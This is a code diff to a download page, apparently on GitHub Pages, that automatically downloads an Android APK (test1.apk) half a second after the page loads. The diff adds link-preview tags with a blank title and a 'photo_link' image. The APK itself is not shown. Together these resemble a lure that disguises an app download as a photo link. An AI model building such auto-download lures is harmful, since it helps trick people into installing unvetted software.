@@ -8,8 +8,16 @@
     <meta http-equiv="Expires" content="0">
     <title>Начало загрузки</title>
     
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://94kz55hfdb-netizen.github.io/test/">
+    <meta property="og:title" content=""> 
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo_link.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
     <style>
         body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        /* ... (Стили остаются без изменений) ... */
         .spinner { 
             border: 8px solid #f3f3f3; 
             border-top: 8px solid #3498db; 
@@ -35,15 +43,9 @@
     
     <script>
         // --- 🔑 КЛЮЧЕВАЯ КОНФИГУРАЦИЯ ---
-        
-        // 1. Ваш корректный базовый URL
         const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
-        
-        // 2. ПУТЬ К ФАЙЛУ (downloads/test1.apk)
-        // Добавляем параметр для обхода кэша (?v=...)
         const apkUrl = repoBaseUrl + 'downloads/test1.apk?v=' + Date.now(); 
         const apkFilename = 'test1.apk'; 
-        
         // ------------------------------------
 
         function startDownload() {
@@ -60,11 +62,9 @@
         }
 
         window.onload = function() {
-            // Ссылка для ручного скачивания (без параметра кэша)
             document.getElementById('manual_link').href = repoBaseUrl + 'downloads/test1.apk';
             document.getElementById('filename').textContent = apkFilename;
             
-            // Запускаем автоматическое скачивание
             setTimeout(startDownload, 500); 
         };
     </script>
